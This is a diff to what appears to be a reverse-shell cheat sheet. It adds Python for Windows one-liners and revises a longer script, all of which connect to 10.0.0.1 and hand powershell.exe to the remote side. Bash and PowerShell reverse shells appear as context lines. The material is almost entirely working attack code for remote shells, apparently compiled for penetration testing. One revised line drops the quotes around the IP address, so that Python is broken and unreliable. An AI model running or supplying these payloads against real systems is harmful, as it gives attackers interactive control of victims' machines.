@@ -17,12 +17,21 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-**Python**
+**Python for Linux**
 
-```python
+```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+**Python for Windows**
+
+```
+exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",1234)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
+```
+or
+```
+python -c 'exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",1234)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
+```
 
 **Perl**
 
@@ -156,35 +165,27 @@ p=subprocess.call(["/bin/sh","-i"])
 **Python for Windows**
 
 ```python
-import os,socket,subprocess,threading;
+import os, socket, subprocess, threading, sys
+
 def s2p(s, p):
-    while True:
-        data = s.recv(1024)
-        if len(data) > 0:
-            p.stdin.write(data)
-            p.stdin.flush()
+    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
 
 def p2s(s, p):
-    while True:
-        s.send(p.stdout.read(1))
+    while True: s.send(p.stdout.read(1).encode())
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.0.0.1",666))
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+while True:
+    try: s.connect((10.0.0.1, 666)); break
+    except: pass
 
-p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
 
-s2p_thread = threading.Thread(target=s2p, args=[s, p])
-s2p_thread.daemon = True
-s2p_thread.start()
+threading.Thread(target=s2p, args=[s,p], daemon=True).start()
 
-p2s_thread = threading.Thread(target=p2s, args=[s, p])
-p2s_thread.daemon = True
-p2s_thread.start()
+threading.Thread(target=p2s, args=[s,p], daemon=True).start()
 
-try:
-    p.wait()
-except KeyboardInterrupt:
-    s.close()
+try: p.wait()
+except: s.close(); sys.exit(0)
 ```
 
 **Groovy**
